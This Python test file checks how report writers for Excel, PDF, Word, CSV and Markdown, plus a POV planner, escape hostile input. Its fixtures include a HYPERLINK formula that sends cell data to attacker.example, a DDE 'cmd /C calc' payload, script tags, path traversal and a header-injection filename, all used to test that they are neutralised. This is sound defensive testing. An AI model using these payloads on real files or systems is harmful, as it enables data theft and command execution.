"""Deep QA of the report writers and the POV planner (cloud wave 6, reports):
pov.py, report_docx.py, report_exports.py, pdf_writer.py, xlsx_writer.py,
csv_safe.py and md_safe.py.

Every Word, PDF, Excel, CSV and Markdown output here is opened and parsed
(zip + XML parser, a PDF cross-reference walk, csv.reader, python-docx), so
"well-formed" is checked, not assumed. No tenant, no network, no clock and
no randomness: stores live in tmp_path (the POV fixture of test_pov.py),
time is injected, ids are checked by shape only."""
from __future__ import annotations

import csv
import io
import json
import os
import re
import stat
import time
import zipfile
from datetime import datetime, timezone
from xml.etree import ElementTree as ET

import pytest

import csv_safe
import md_safe
import pdf_writer
import pov
import report_docx
import report_exports
import tenant_profiles
import xlsx_writer
from test_pov import CREDS, SECRET, _export, _profile, _start, app  # noqa: F401 - `app` is the fixture

NS = {"m": "http://schemas.openxmlformats.org/spreadsheetml/2006/main"}
W = "{http://schemas.openxmlformats.org/wordprocessingml/2006/main}"
HOSTILE = ['=HYPERLINK("http://attacker.example/?d="&A1,"x")', "+cmd|' /C calc'!A0", "-2+3", "@SUM(A1)", "\tTAB", "\rCR",
           "<script>alert(1)</script>", "</t></is></c><c><f>1+1</f>", "a & b < c > d \" ' ", "(paren) \\back\\ ) (",
           "ctl\x00\x01\x07\x0b\x1f end", "lone \ud800 surrogate", "bidi ‮ fdp.exe", "￾￿ nonchars"]
CJK_RTL = "数据防泄漏策略 データ損失防止 데이터 손실 방지 سياسة منع فقدان البيانات מדיניות"


# ── Parsers: open what was written ──────────────────────────────────────

def _xlsx(data: bytes):
    """Every part parsed as XML; {sheet name: [(ref, type, text, has_formula)]}."""
    z = zipfile.ZipFile(io.BytesIO(data))
    assert z.testzip() is None
    parts = {n: ET.fromstring(z.read(n)) for n in z.namelist() if n.endswith((".xml", ".rels"))}
    names = [s.get("name") for s in parts["xl/workbook.xml"].iter("{%s}sheet" % NS["m"])]
    out = {}
    for i, name in enumerate(names):
        cells = []
        for c in parts[f"xl/worksheets/sheet{i + 1}.xml"].iter("{%s}c" % NS["m"]):
            t = c.find("m:is/m:t", NS)
            v = c.find("m:v", NS)
            cells.append((c.get("r"), c.get("t"), t.text if t is not None else (v.text if v is not None else None),
                          c.find("m:f", NS) is not None))
        out[name] = cells
    return out


def _pdf_literal(s: str) -> str:
    out, i = [], 0
    while i < len(s):
        ch = s[i]
        if ch == "\\":
            nxt = s[i + 1]
            if nxt.isdigit():
                out.append(chr(int(s[i + 1:i + 4], 8)))
                i += 4
                continue
            out.append(nxt)
            i += 2
            continue
        out.append(ch)
        i += 1
    return "".join(out).encode("latin-1").decode("cp1252")


def _pdf(data: bytes):
    """Walk the PDF: header, every xref offset lands on its object, each
    stream's /Length is its length, content streams are ASCII with
    balanced string literals. Returns the shown texts and the info dict."""
    assert data.startswith(b"%PDF-1.4\n") and data.rstrip().endswith(b"%%EOF")
    xref_at = int(re.search(rb"startxref\n(\d+)\n%%EOF", data).group(1))
    assert data[xref_at:xref_at + 5] == b"xref\n"
    count = int(re.match(rb"xref\n0 (\d+)\n", data[xref_at:]).group(1))
    rows = data[xref_at:].split(b"\n")[3:3 + count - 1]
    texts, ys = [], []
    for n, row in enumerate(rows, start=1):
        off = int(row[:10])
        assert data[off:].startswith(b"%d 0 obj\n" % n), n
        body = data[off:data.index(b"\nendobj\n", off)]
        m = re.search(rb"<< /Length (\d+) >>\nstream\n", body)
        if m:
            stream = body[m.end():m.end() + int(m.group(1))]
            assert body[m.end() + int(m.group(1)):] == b"\nendstream"
            stream.decode("ascii")
            for line in stream.decode("ascii").split("\n"):
                lit = re.search(r" Tm \((.*)\) Tj ET$", line)
                if lit:
                    raw = lit.group(1)
                    assert not re.search(r"(?<!\\)[()]", raw.replace("\\\\", "")), line
                    texts.append(_pdf_literal(raw))
                    ys.append(float(line.split(" Tm")[0].split()[-1]))
    trailer = data[data.index(b"trailer"):]
    info_id = int(re.search(rb"/Info (\d+) 0 R", trailer).group(1))
    off = int(rows[info_id - 1][:10])
    info = data[off:data.index(b"\nendobj\n", off)].decode("ascii")
    fields = {k: bytes.fromhex(v[4:]).decode("utf-16-be") for k, v in re.findall(r"/(\w+) <(FEFF[0-9A-F]*)>", info)}
    return texts, ys, fields


def _docx(data: bytes):
    """The document part parsed as XML (well-formed) and its text runs."""
    z = zipfile.ZipFile(io.BytesIO(data))
    for n in z.namelist():
        if n.endswith(".xml"):
            ET.fromstring(z.read(n))
    root = ET.fromstring(z.read("word/document.xml"))
    return "\n".join("".join(t.text or "" for t in p.iter(W + "t")) for p in root.iter(W + "p"))


def _report_file(tmp_path, results, cfg):
    out = str(tmp_path / "r.docx")
    report_docx.generate_report(results, cfg, out)
    with open(out, "rb") as f:
        return f.read()


# ── Excel (xlsx_writer) ─────────────────────────────────────────────────

def test_xlsx_a_formula_looking_cell_at_the_cap_stays_within_excels_limit():
    """ASVS V5.3.10 · CWE-1236 · CWE-20 · WSTG-INPV-01: a quoted '=' cell cut at the cap is at most 32,767 characters (one more and Excel calls the workbook damaged)."""
    text = xlsx_writer.cell_text("=" + "a" * 40000)
    assert text.startswith("'=") and text.endswith(xlsx_writer.TRUNCATED)
    assert len(text) == xlsx_writer.MAX_CELL_CHARS


def test_xlsx_the_cell_cap_counts_utf16_units_as_excel_does():
    """ASVS V5.1.3 · CWE-20 · WSTG-INPV-01: emoji and other astral characters count twice towards the cap, as Excel counts them."""
    text = xlsx_writer.cell_text("\U0001F600" * 20000)
    assert len(text.encode("utf-16-le")) // 2 <= xlsx_writer.MAX_CELL_CHARS and text.endswith(xlsx_writer.TRUNCATED)


def test_xlsx_text_under_the_cap_is_kept_whole():
    """ASVS V5.1.3 · CWE-20: boundary: a cell of exactly 32,767 characters is not cut."""
    assert xlsx_writer.cell_text("a" * xlsx_writer.MAX_CELL_CHARS) == "a" * xlsx_writer.MAX_CELL_CHARS


def test_xlsx_hostile_text_gives_a_well_formed_workbook_with_no_formula():
    """ASVS V5.3.10 · ASVS V5.3.1 · CWE-1236 · CWE-91 · WSTG-INPV-01: XML-unsafe, markup and formula text is escaped, every part parses and no cell is a formula."""
    wb = xlsx_writer.Workbook(title="t & <x>")
    wb.add_sheet("Rules [1]: a/b*?", columns=["Name", "Value"], rows=[[h, h] for h in HOSTILE])
    cells = _xlsx(wb.to_bytes())
    texts = [c[2] for c in cells["Rules 1 a b"] if c[0][0] == "A"][1:]
    assert not any(c[3] for c in cells["Rules 1 a b"])
    assert all(t.startswith("'") for t in texts[:6]) and texts[7] == "</t></is></c><c><f>1+1</f>"
    assert "‮" not in "".join(texts) and "\x00" not in "".join(texts)


def test_xlsx_cjk_and_rtl_text_round_trips():
    """ASVS V5.1.1 · CWE-176 · WCAG 2.2 SC 3.1.2: CJK and right-to-left text is kept exactly in a cell."""
    wb = xlsx_writer.Workbook()
    wb.add_sheet("Ünïcødé 数据", columns=["Text"], rows=[[CJK_RTL]])
    cells = _xlsx(wb.to_bytes())
    assert cells["Ünïcødé 数据"][1][2] == CJK_RTL


def test_xlsx_a_large_workbook_is_written_and_parses_quickly():
    """ASVS V11.1.4 · CWE-400 · WSTG-BUSL-07: 5,000 rows by 8 columns of tenant text write and parse well inside the test budget."""
    wb = xlsx_writer.Workbook()
    wb.add_sheet("Big", columns=[f"C{i}" for i in range(8)], rows=[[f"rule {r} col {c} = x" for c in range(8)] for r in range(5000)])
    t0 = time.perf_counter()
    cells = _xlsx(wb.to_bytes())
    assert len(cells["Big"]) == 8 * 5001 and time.perf_counter() - t0 < 2.0


# ── PDF (pdf_writer) ────────────────────────────────────────────────────

def test_pdf_a_heading_taller_than_a_page_goes_on_over_the_next_pages():
    """ASVS V5.1.3 · CWE-20 · WCAG 2.2 SC 1.4.10: a very long (tenant-named) heading breaks across pages; no line is drawn below the bottom margin."""
    doc = pdf_writer.PdfDocument()
    doc.heading("word " * 3000)
    texts, ys, _ = _pdf(doc.to_bytes())
    assert len(doc.pages) > 1 and min(ys) >= doc.bottom - 30   # the footer sits 22 pt below the margin


def test_pdf_a_table_without_columns_draws_nothing_instead_of_failing():
    """ASVS V7.4.1 · CWE-755: boundary: a table with no columns is skipped, never a crash (500)."""
    doc = pdf_writer.PdfDocument()
    doc.table([], [])
    _pdf(doc.to_bytes())
    assert doc.pages == [[]]


def test_pdf_the_document_title_shows_no_bidi_override_or_control():
    """ASVS V5.3.1 · CWE-451 · CWE-116: the title a reader shows in its window bar has a right-to-left override as U+FFFD and no control character."""
    doc = pdf_writer.PdfDocument(title="Plan acme‮gpj.exe\x07\x00", author="Ann⁦x", subject="s\ud800")
    _, _, info = _pdf(doc.to_bytes())
    assert info["Title"] == "Plan acme�gpj.exe" and info["Author"] == "Ann�x" and info["Subject"] == "s"


def test_pdf_string_escaping_round_trips_parentheses_and_backslashes():
    """ASVS V5.3.1 · CWE-74 · CWE-116: ( ) and \\ in text are escaped in the content stream and read back as written."""
    doc = pdf_writer.PdfDocument()
    doc.paragraph(r"a (b) \c ) ( \\ end")
    texts, _, _ = _pdf(doc.to_bytes())
    assert r"a (b) \c ) ( \\ end" in texts


def test_pdf_hostile_text_in_every_block_keeps_the_file_well_formed():
    """ASVS V5.3.1 · CWE-74 · CWE-20 · WSTG-INPV-01: headings, paragraphs, bullets, key/values and tables of hostile text all give a valid PDF."""
    doc = pdf_writer.PdfDocument(title=HOSTILE[0], footer=HOSTILE[9])
    for h in HOSTILE:
        doc.heading(h, 2)
        doc.paragraph(h)
    doc.bullets(HOSTILE)
    doc.key_values([(h, h) for h in HOSTILE])
    doc.table(HOSTILE[:3], [HOSTILE[i:i + 3] for i in range(0, 12, 3)])
    texts, _, _ = _pdf(doc.to_bytes())
    assert "<script>alert(1)</script>" in texts and not any("\x00" in t or "‮" in t for t in texts)


def test_pdf_a_long_unbroken_word_wraps_inside_the_margins():
    """ASVS V5.1.3 · CWE-20 · WCAG 2.2 SC 1.4.10: a 2,000-character token (a URL, a hash) is broken across lines that each fit the text width."""
    doc = pdf_writer.PdfDocument()
    lines = pdf_writer.wrap("x" * 2000, 10, doc.content_width)
    assert len(lines) > 5 and all(pdf_writer.text_width(ln, 10) <= doc.content_width for ln in lines)
    assert "".join(lines) == "x" * 2000


def test_pdf_cjk_and_rtl_text_becomes_visible_question_marks():
    """ASVS V5.1.1 · CWE-176 · CWE-838: text outside WinAnsi is shown as '?', never dropped silently and never breaking the file."""
    doc = pdf_writer.PdfDocument()
    doc.paragraph("Rule " + CJK_RTL)
    texts, _, _ = _pdf(doc.to_bytes())
    shown = " ".join(texts)
    assert shown.startswith("Rule ???????") and "?" * 5 in shown


def test_pdf_a_large_table_breaks_pages_and_repeats_its_header():
    """ASVS V11.1.4 · CWE-400 · WCAG 2.2 SC 1.3.1: 1,500 rows fill many pages, each carrying the header row, and the file stays valid."""
    doc = pdf_writer.PdfDocument()
    doc.table(["Kind", "Name"], [["Rule", f"rule {i}"] for i in range(1500)])
    texts, _, _ = _pdf(doc.to_bytes())
    assert len(doc.pages) > 10 and texts.count("Kind") == len(doc.pages) and "rule 1499" in texts


# ── Word (report_docx) ──────────────────────────────────────────────────

ROW = {"id": "ZIA-01", "label": "SSL inspection", "status": "FAIL", "detail": "No SSL rule. Best Practice: inspect.", "section": "SSL"}


@pytest.mark.parametrize("meta", [{"org_name": 5, "assessor": None, "cloud": ["zscaler", "two"]}, {"org_name": {"a": 1}}, {"org_name": True}])
def test_docx_metadata_that_is_not_text_still_gives_a_report(tmp_path, meta):
    """ASVS V5.1.3 · ASVS V7.4.1 · CWE-20 · CWE-755: a number, list or object as the organisation name is shown as text, never a failed report (500)."""
    text = _docx(_report_file(tmp_path, [dict(ROW)], meta))
    assert str(meta["org_name"]) in text


def test_docx_a_check_without_status_or_with_a_null_detail_is_reported(tmp_path):
    """ASVS V7.4.1 · CWE-755 · CWE-476: a saved report from an older run (no status, detail null) still opens as a report."""
    text = _docx(_report_file(tmp_path, [{"id": "A", "label": "Missing status"}, {"id": "B", "label": "Null", "status": "INFO", "detail": None}], {}))
    assert "Missing status" in text and "Null" in text


def test_docx_channel_coverage_reasons_that_are_not_text_are_shown(tmp_path):
    """ASVS V5.1.3 · CWE-20 · CWE-755: a prerequisite's reasons holding numbers are shown as text, never a failed report."""
    cov = {"declared": True, "note": "n", "zscaler": [{"id": "x", "name": "Web DLP"}], "prerequisites": [{"id": "x", "note": "p", "reasons": [1, "two"]}]}
    text = _docx(_report_file(tmp_path, [dict(ROW)], {"channel_coverage": cov}))
    assert "1 two" in text


def test_docx_the_report_time_is_utc(tmp_path, monkeypatch):
    """ASVS V7.3.4 · CWE-1176 · CWE-682: the 'Report generated ... UTC' line is the UTC time, from the injected clock."""
    monkeypatch.setattr(report_docx, "_now", lambda: datetime(2030, 1, 2, 3, 4, 5, tzinfo=timezone.utc))
    text = _docx(_report_file(tmp_path, [dict(ROW)], {}))
    assert "Report generated: 2030-01-02 03:04:05 UTC" in text and "January 02, 2030" in text


def test_docx_hostile_text_is_escaped_and_the_document_is_well_formed(tmp_path):
    """ASVS V5.3.1 · CWE-91 · CWE-116 · WSTG-INPV-01: markup, XML-unsafe characters and a bidi override in check text become inert, well-formed text."""
    rows = [dict(ROW, id=f"H{i}", label=h, detail=h) for i, h in enumerate(HOSTILE)]
    text = _docx(_report_file(tmp_path, rows, {"org_name": "<w:body/>&amp;"}))
    assert "</t></is></c><c><f>1+1</f>" in text and "<w:body/>&amp;" in text
    assert "‮" not in text and "\x07" not in text


def test_docx_the_pov_report_keeps_cjk_rtl_and_long_text():
    """ASVS V5.1.1 · CWE-176 · WCAG 2.2 SC 3.1.2: the POV Word report keeps CJK and right-to-left names and a long paragraph whole."""
    rep = {"title": "Proof of value: " + CJK_RTL, "summary": "s " * 5000, "details": [("Customer", CJK_RTL)],
           "sections": [{"heading": "Tests", "table": {"columns": ["A", "B"], "rows": [["Pass", CJK_RTL]]}, "bullets": [HOSTILE[6]]}]}
    text = _docx(report_docx.pov_report(rep))
    assert CJK_RTL in text and ("s " * 5000).strip() in text and "<script>alert(1)</script>" in text


# ── CSV (csv_safe) ──────────────────────────────────────────────────────

@pytest.mark.parametrize("value,out", [("=1+1", "'=1+1"), ("+1+1", "'+1+1"), ("-1+1", "'-1+1"), ("@x", "'@x"), ("\t=1", "'\t=1"),
                                       ("\r=1", "'\r=1"), ("\n=1", "'\n=1"), ("-5", "-5"), ("+1.5e3", "+1.5e3"), ("-.5", "-.5"),
                                       ("--5", "'--5"), ("-", "'-"), ("", ""), ("plain", "plain"), (7, 7), (None, None)])
def test_csv_cells_that_start_like_a_formula_are_quoted_and_numbers_are_not(value, out):
    """ASVS V5.3.10 · CWE-1236 · WSTG-INPV-01 · OWASP A03:2021: oracle table: every trigger character is neutralised, a plain number is left as it is."""
    assert csv_safe.safe_cell(value) == out


def test_csv_written_rows_parse_back_with_every_formula_neutralised():
    """ASVS V5.3.10 · CWE-1236 · CWE-116: the writer's and the dict writer's output parses as CSV and no cell (header included) starts a formula."""
    buf = io.StringIO()
    w = csv_safe.dict_writer(buf, ["=h", "b"])
    w.writeheader()
    w.writerows([{"=h": h, "b": CJK_RTL} for h in HOSTILE])
    rows = list(csv.reader(io.StringIO(buf.getvalue())))
    assert rows[0][0] == "'=h" and len(rows) == len(HOSTILE) + 1
    assert all(r[0][:1] not in "=+-@\t\r" for r in rows) and all(r[1] == CJK_RTL for r in rows[1:])


# ── Markdown (md_safe) ──────────────────────────────────────────────────

@pytest.mark.parametrize("value", ["# Approved by security", "###### x", "- [x] done", "+ item", "* item", "---", "* * *", "___", "===",
                                   "1. step", "12) step"])
def test_md_a_value_can_never_start_a_heading_list_or_rule(value):
    """ASVS V5.3.1 · CWE-74 · CWE-79 · WSTG-CLNT-03: a tenant name at the start of a line ("- {name}" too) never becomes a heading, list item or rule."""
    out = md_safe.text(value)
    assert not re.match(r"^(#{1,6}(\s|$)|[-+*]\s|[-*_=]{3}|\d+[.)](\s|$))", out)
    assert out.replace("\\", "") == value


@pytest.mark.parametrize("value", ["-5", "-", "#tag", "1.5", "2024.01", "a # b", "x - y"])
def test_md_ordinary_values_that_only_look_like_markers_are_unchanged(value):
    """ASVS V5.3.1 · CWE-116: negative: a number, a lone dash or a hashtag stays exactly as it is."""
    assert md_safe.text(value) == value


def test_md_a_link_target_with_a_pipe_is_never_a_link():
    """ASVS V5.3.1 · CWE-74 · WSTG-CLNT-03: a URL holding '|' (which would split a table row) is shown as text, its pipe escaped."""
    out = md_safe.link("label", "https://a.example/x|y")
    assert md_safe.url("https://a.example/x|y") is None and "](" not in out and "\\|" in out


def test_md_escape_data_still_keeps_a_plain_url_as_a_link_target():
    """ASVS V5.3.1 · CWE-116: regression: an http(s) URL without a pipe is kept as it is so it still links."""
    assert md_safe.escape_data({"u": ["https://help.zscaler.com/zia", "x|y"]}) == {"u": ["https://help.zscaler.com/zia", "x\\|y"]}


def test_md_the_block_marker_check_is_linear_on_hostile_input():
    """ASVS V5.1.5 · CWE-1333 · WSTG-INPV-12: 200,000 characters of near-rule input are escaped in well under a second (no ReDoS)."""
    t0 = time.perf_counter()
    md_safe.text("- " * 100000 + "x")
    md_safe.text("*" + " " * 100000 + "*" + " " * 100000 + "x")
    assert time.perf_counter() - t0 < 1.0


def test_md_html_links_images_and_breaks_are_inert():
    """ASVS V5.3.1 · CWE-79 · OWASP A03:2021: regression: tags, links, images and line breaks in a value stay inert text on one line."""
    out = md_safe.text("<img src=x onerror=alert(1)>\n# x [a](javascript:alert(1)) ![i](x)")
    assert "<" not in out and "\n" not in out and "\\[a\\]" in out and "!\\[i\\]" in out


# ── Report exports (report_exports) ─────────────────────────────────────

def test_assessment_workbook_from_a_hostile_post_is_well_formed():
    """ASVS V5.1.3 · ASVS V5.3.10 · CWE-1236 · CWE-20 · WSTG-INPV-01: odd types and formula text in a posted report give a valid workbook with no formula."""
    report = {"metadata": {"org": {"x": 1}, "timestamp": 5, "assessor": ["a"]}, "hidden_checks": "x",
              "checks": [{"id": h, "label": h, "status": "FAIL", "detail": h, "section": h} for h in HOSTILE] + ["junk", {"id": 1, "status": 3}]}
    sheets = _xlsx(report_exports.assessment_workbook(report))
    assert "Findings" in sheets and not any(c[3] for cells in sheets.values() for c in cells)
    titles = [c[2] for c in sheets["Findings"] if c[0].startswith("C")]
    assert titles[1].startswith("'=HYPERLINK")


def test_assessment_workbook_refuses_more_than_the_check_cap():
    """ASVS V11.1.4 · CWE-400 · CWE-770: boundary: one check over MAX_CHECKS is refused in words."""
    with pytest.raises(ValueError, match="Too many checks"):
        report_exports.assessment_checks({"checks": [{"id": "a"}] * (report_exports.MAX_CHECKS + 1)})


def test_plan_pdf_and_workbook_of_a_large_plan_are_well_formed():
    """ASVS V11.1.4 · CWE-400 · CWE-74: a 2,000-item preflight with hostile names gives a valid PDF and workbook."""
    items = [{"kind": "policy", "name": HOSTILE[i % len(HOSTILE)] + str(i), "status": "create", "reason": "r", "depends_on": ["d"]} for i in range(2000)]
    rep = {"tenant_label": "acme ‮ (production)", "plan_hash": "ab" * 32, "items": items, "warnings": HOSTILE, "packs": [{"id": "p"}]}
    texts, _, info = _pdf(report_exports.plan_pdf(rep))
    sheets = _xlsx(report_exports.plan_workbook(rep))
    assert "‮" not in info["Title"] and len(sheets["Items"]) > 2000 * 5 and any("1999" in t for t in texts)


def test_pov_pdf_of_a_report_document_is_well_formed():
    """ASVS V5.3.1 · CWE-74 · CWE-116: the POV report document with hostile text, CJK and long text gives a valid PDF."""
    rep = {"title": HOSTILE[9], "summary": "s " * 3000, "footer": CJK_RTL, "details": [("Customer", HOSTILE[0])],
           "sections": [{"heading": h, "paragraphs": [h], "table": {"columns": ["A"], "rows": [[h]]}, "items": [{"title": h, "bullets": [h]}],
                         "bullets": [h], "note": h} for h in HOSTILE]}
    texts, _, info = _pdf(report_exports.pov_pdf(rep))
    assert info["Title"] == HOSTILE[9] and HOSTILE[0] in texts


@pytest.mark.parametrize("raw,out", [("../../etc/passwd", "etc_passwd"), ("", "report"), ("数据", "report"), ("a" * 100, "a" * 60),
                                     ('x";\r\nSet-Cookie: a=b', "x_Set-Cookie_a_b")])
def test_export_file_names_are_safe_header_values(raw, out):
    """ASVS V12.3.1 · CWE-22 · CWE-113 · WSTG-INPV-15: a name from the tenant becomes letters, digits, - and _ only (no path, no header split)."""
    assert report_exports.safe_filename_part(raw) == out


# ── POV planner (pov) ───────────────────────────────────────────────────

def _note_change(app, pid, rev, notes, by_header=None):
    return app.post("/api/pov/update", json={"profile_id": pid, "rev": rev, "changes": {"notes": notes}})


@pytest.mark.parametrize("rev", [True, "1", 1.0, None, 0, 2])
def test_pov_a_revision_that_is_not_the_current_integer_is_refused(app, rev):
    """ASVS V11.1.2 · CWE-362 · CWE-367 · WSTG-BUSL-05: boundary: True, "1", 1.0, null and the wrong number are all stale revisions (409)."""
    pid = _profile()
    _start(app, pid)
    r = pov.update
    with pytest.raises(pov.PovError) as e:
        r(pid, None, rev, {"status": "testing"}, by="x")
    assert e.value.status == 409 and pov.require(pid)[1]["status"] == "planning"


def test_pov_the_revision_goes_up_by_one_on_every_save():
    """ASVS V11.1.2 · CWE-362: the revision a save returns is the one the next save must name."""
    p = {"rev": 4}
    pov._bump(p)
    assert p["rev"] == 5 and p["updated_at"]


def test_pov_a_page_cannot_forge_who_wrote_a_kept_note(app):
    """ASVS V4.1.3 · ASVS V7.1.1 · CWE-345 · CWE-639: re-sending a stored note with another author and time keeps the stored author and time."""
    pid = _profile()
    p = _start(app, pid)
    p = _note_change(app, pid, p["rev"], [{"text": "block page seen"}]).json()["pov"]
    note = dict(p["notes"][0], by="The CISO", at="2000-01-01T00:00:00+00:00")
    p2 = _note_change(app, pid, p["rev"], [note]).json()["pov"]
    assert p2["notes"][0]["by"] == p["notes"][0]["by"] and p2["notes"][0]["at"] == p["notes"][0]["at"]


def test_pov_an_edited_note_is_the_editors_now(app, monkeypatch):
    """ASVS V7.1.1 · CWE-345: a note whose text the page changed carries the editor and the current time, not what the page sent."""
    pid = _profile()
    p = _start(app, pid)
    p = _note_change(app, pid, p["rev"], [{"text": "first"}]).json()["pov"]
    monkeypatch.setattr(pov, "_now", lambda: "2031-05-06T07:08:09+00:00")
    p2 = _note_change(app, pid, p["rev"], [dict(p["notes"][0], text="changed", by="The CISO", at="2000-01-01")]).json()["pov"]
    assert p2["notes"][0]["at"] == "2031-05-06T07:08:09+00:00" and p2["notes"][0]["by"] != "The CISO"


def test_pov_a_page_cannot_forge_who_wrote_a_test_note(app):
    """ASVS V4.1.3 · CWE-345 · CWE-639: a test's evidence note re-sent with another author keeps the stored author."""
    pid = _profile()
    p = _start(app, pid)
    up = lambda rev, ev: app.post("/api/pov/update", json={"profile_id": pid, "rev": rev, "changes": {"tests": {"url-block": {"status": "pass", "evidence": ev}}}})  # noqa: E731
    p = up(p["rev"], [{"kind": "note", "text": "seen"}]).json()["pov"]
    stored = p["tests"]["url-block"]["evidence"][0]
    p2 = up(p["rev"], [dict(stored, by="The CISO", at="2000-01-01")]).json()["pov"]
    assert p2["tests"]["url-block"]["evidence"][0]["by"] == stored["by"] and p2["tests"]["url-block"]["evidence"][0]["at"] == stored["at"]


def test_pov_a_note_reusing_a_verdicts_id_gets_an_id_of_its_own(app):
    """ASVS V4.1.3 · CWE-345 · CWE-694: a page note carrying a Prove it verdict's id never shadows the verdict; the note gets a new id."""
    pid = _profile()
    _start(app, pid)
    p = pov.add_system_evidence(pid, None, "url-block", pov.prove_evidence(pov.RUNBOOK_BY_ID["url-block"], {"verdict": {"outcome": "blocked"}}), by="app")
    vid = p["tests"]["url-block"]["evidence"][0]["id"]
    p2 = pov.update(pid, None, p["rev"], {"tests": {"url-block": {"status": "pass", "evidence": [{"kind": "note", "id": vid, "text": "n", "by": "X"}]}}}, by="ann")
    ids = [e["id"] for e in p2["tests"]["url-block"]["evidence"]]
    assert len(set(ids)) == 2 and [e["kind"] for e in p2["tests"]["url-block"]["evidence"]] == ["prove", "note"]


def test_pov_prove_it_replaces_its_last_verdict_and_keeps_the_notes(app):
    """ASVS V4.1.3 · CWE-345 · CWE-841: a second Prove it replaces the first verdict, keeps the page's notes and bumps the revision."""
    pid = _profile()
    p = _start(app, pid)
    p = pov.update(pid, None, p["rev"], {"tests": {"url-block": {"status": "pass", "evidence": [{"kind": "note", "text": "seen"}]}}}, by="ann")
    test = pov.RUNBOOK_BY_ID["url-block"]
    pov.add_system_evidence(pid, None, "url-block", pov.prove_evidence(test, {"verdict": {"outcome": "none", "headline": "Allowed"}}), by="app")
    last = pov.add_system_evidence(pid, None, "url-block", pov.prove_evidence(test, {"verdict": {"outcome": "blocked", "headline": "Blocked"}}), by="app")
    ev = last["tests"]["url-block"]["evidence"]
    assert [e["kind"] for e in ev] == ["note", "prove"] and ev[1]["verdict"]["agrees"] is True and last["rev"] == p["rev"] + 2


def test_pov_prove_it_for_an_unknown_test_is_a_404():
    """ASVS V5.1.3 · CWE-20: a test id outside the runbook is refused before anything is read."""
    with pytest.raises(pov.PovError) as e:
        pov.add_system_evidence("p", None, "../x", {}, by="x")
    assert e.value.status == 404


def test_pov_a_secret_in_a_prove_it_verdict_is_masked_before_it_is_kept(app):
    """ASVS V8.3.4 · CWE-312 · CWE-532: a Path analyzer headline that echoes the sign-in secret is stored masked."""
    pid = _profile()
    _start(app, pid)
    ev = pov.prove_evidence(pov.RUNBOOK_BY_ID["url-block"], {"verdict": {"outcome": "blocked", "headline": f"Blocked by rule {SECRET}", "blocked_by": SECRET}})
    pov.add_system_evidence(pid, dict(CREDS), "url-block", ev, by="app")
    assert SECRET not in open(tenant_profiles.pov_path(pid), encoding="utf-8").read()


def test_pov_a_secret_in_insights_counts_is_masked_before_it_is_kept(app):
    """ASVS V8.3.4 · CWE-312 · CWE-532: an Insights row name that echoes the sign-in secret is stored masked."""
    pid = _profile()
    _start(app, pid)
    counts = pov.insights_counts({"sections": {"web_action": {"title": "Web", "rows": [{"name": SECRET, "total": 3}]}}}, "7 days")
    pov.add_insights(pid, dict(CREDS), counts, by="app")
    assert SECRET not in open(tenant_profiles.pov_path(pid), encoding="utf-8").read()


@pytest.mark.parametrize("created_at,fragment", [("9999-01-01T00:00:00+00:00", "future"), ("not a date", "not a date"), ("2999-12-31", "future")])
def test_pov_an_import_cannot_move_its_start_to_hide_the_changes_made(app, created_at, fragment):
    """ASVS V5.1.4 · CWE-20 · CWE-345 · WSTG-BUSL-01: an imported start in the future or not a time is refused (it decides which changes the report lists)."""
    pid = _profile()
    _start(app, pid)
    data = json.loads(_export(app, pid))
    data["created_at"] = created_at
    r = app.post("/api/pov/import", json={"profile_id": pid, "content": json.dumps(data), "replace": True})
    assert r.status_code == 400 and fragment in r.json()["detail"]


def test_pov_an_imported_start_time_is_kept_in_utc(app):
    """ASVS V5.1.4 · CWE-20: regression: an exported file's real start time (Z or an offset) imports as the same instant in UTC."""
    pid = _profile()
    _start(app, pid)
    data = json.loads(_export(app, pid))
    data["created_at"] = "2024-03-01T10:00:00+02:00"
    r = app.post("/api/pov/import", json={"profile_id": pid, "content": json.dumps(data), "replace": True})
    assert r.status_code == 200 and r.json()["pov"]["created_at"] == "2024-03-01T08:00:00+00:00"


def test_pov_a_tampered_template_still_starts_a_valid_pov(app):
    """ASVS V5.1.4 · CWE-20 · CWE-755: a templates.json entry with an unknown vertical and odd criteria starts the default vertical, never a 500."""
    pid = _profile()
    path = pov._templates_path()
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8") as f:
        json.dump({"templates": [{"id": "bad-1", "name": "Bad", "vertical": "casino", "products": "dlp", "criteria": [7, "ok", "x" * 999]}]}, f)
    r = app.post("/api/pov/create", json={"profile_id": pid, "intake": {"customer": "Acme"}, "template_id": "bad-1"})
    assert r.status_code == 200, r.text
    p = r.json()["pov"]
    assert p["intake"]["vertical"] == "general" and [c["text"] for c in p["criteria"]] == ["ok"]


def test_pov_its_folder_lock_and_template_files_are_owner_only(app):
    """ASVS V8.3.4 · ASVS V12.3.4 · CWE-276 · CWE-732: the POV folder is 0700 and the POV, its lock and the templates file are 0600."""
    pid = _profile()
    _start(app, pid)
    app.post("/api/pov/templates", json={"profile_id": pid, "name": "T"})
    folder = os.path.dirname(tenant_profiles.pov_path(pid))
    modes = {n: stat.S_IMODE(os.stat(os.path.join(folder, n)).st_mode) for n in (f"{pid}.json", ".lock", pov.TEMPLATES_FILE)}
    assert stat.S_IMODE(os.stat(folder).st_mode) == 0o700 and set(modes.values()) == {0o600}


def test_pov_the_report_for_a_sign_in_naming_another_tenant_is_refused(app):
    """ASVS V4.2.1 · CWE-639 · WSTG-ATHZ-04: the customer report never opens against another tenant's sign-in (409)."""
    pid = _profile()
    _start(app, pid)
    r = app.post("/api/pov/report", json={"profile_id": pid, "format": "pdf", "vanity_domain": "globex", "client_id": "zzz"})
    assert r.status_code == 409


def test_pov_no_output_ever_carries_the_masked_secret(app):
    """ASVS V8.3.4 · CWE-200 · CWE-312 · OWASP A02:2021: a secret pasted into every text field is absent from the view, the export, the PDF and the Word report."""
    pid = _profile()
    p = _start(app, pid, customer=f"Acme {SECRET[:4]}")
    pov.update(pid, dict(CREDS), p["rev"], {"notes": [{"text": SECRET}], "follow_ups": [{"text": SECRET}],
                                            "criteria": [{"text": SECRET, "status": "met"}],
                                            "tests": {"url-block": {"status": "pass", "notes": SECRET, "evidence": [{"kind": "note", "text": SECRET}]}}}, by="ann")
    view = app.post("/api/pov/open", json={"profile_id": pid}).text
    export = _export(app, pid)
    pdf = app.post("/api/pov/report", json={"profile_id": pid, "format": "pdf"})
    docx = app.post("/api/pov/report", json={"profile_id": pid, "format": "docx"})
    assert pdf.status_code == docx.status_code == 200
    blobs = [view, export, _docx(docx.content)] + [" ".join(_pdf(pdf.content)[0])]
